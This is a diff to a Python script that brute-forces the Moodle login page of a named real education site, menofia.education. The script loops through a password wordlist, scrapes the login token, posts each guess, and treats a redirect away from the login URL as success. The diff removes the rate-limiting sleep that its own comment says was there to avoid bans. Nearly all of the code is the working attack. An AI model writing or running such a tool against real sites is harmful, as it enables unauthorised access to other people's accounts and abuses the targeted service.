@@ -1,17 +1,25 @@
 import re
 import time
 import requests
+import subprocess
 from bs4 import BeautifulSoup
 from multiprocessing import Pool
 
 MAX_THREADS = 6
 LOGIN_URL = "https://menofia.education/login/index.php"
-USERNAME = "YourID"
-PASSWORD = "YourPassword"
-WORDLIST = "wordlist.lst"
+USERNAME = ""
+WORDLIST = "password.lst"
 
+def line_count(filename):
+    """
+    count the number of lines in the wordlist 
 
-def login():
+    note : wc works only in linux
+    """
+    return int(subprocess.check_output(['wc', '-l', filename]).split()[0])
+
+def login(password):
+    """Spamming the login route"""
 
     session = requests.Session()
 
@@ -25,7 +33,7 @@ def login():
 
     data = {
         'username': USERNAME,
-        'password': PASSWORD,
+        'password': password,
         'anchor': "",
         'logintoken': token[0]
     }
@@ -35,35 +43,44 @@ def login():
     }
 
     # to avoid getting banned
-    time.sleep(1)
+    # time.sleep(1)
 
     resp = session.post(LOGIN_URL, data=data, headers=headers)
 
-    print(resp.url)
-
     return resp
 
+def is_logged_in(url):
+    """
+    Checks if the response is OK after sending the POST request 
 
-def crack_password(password):
+    if the url starts with : https://menofia.education/
+        then OK
 
-    response = login()
+    else (https://menofia.education/login/index.php) :
+        fail
+    """
 
-    if bytes('Login failed', encoding='utf-8') not in response.content:
-        return password
+    if "login" not in url:
+        return True
 
+    return False
 
 def main():
+    print("Trying to crack the password")
     with open(WORDLIST) as passwords_file:
-        passwords = passwords_file.readlines()
+        for count, password in enumerate(passwords_file): 
+            # removing the /n
+            password = password[:-1]
 
-    with Pool(MAX_THREADS) as pool:
-        results = pool.map(crack_password, passwords)
-        success = list(filter(None, results))
+            print(f"{count} - Trying password : {password}")
 
-    print(success)
+            # checking the password
+            res = login(password)
 
+            # checking if the login is successful 
+            if is_logged_in(res.url):
+                print(f"Login Success: Password is {password}, {count} tries.")
+                break
 
 if __name__ == '__main__':
-
-    # for testing
-    login()
+    main()
